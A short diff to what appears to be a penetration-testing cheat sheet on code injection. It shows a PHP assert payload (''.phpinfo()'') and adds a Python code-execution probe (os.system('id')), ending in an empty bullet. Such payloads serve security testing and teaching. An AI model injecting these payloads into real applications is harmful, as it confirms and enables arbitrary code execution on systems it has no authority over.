@@ -19,3 +19,12 @@ Assert Function
 ### Exploiting the vulnerability :
 
 - >> `'.phpinfo()'` | test it  
+
+
+### Python Code Execution:
+
+
+>> `os.system('id')` |  if 0 is returned means that the code has executed successfully 
+
+
+>> 
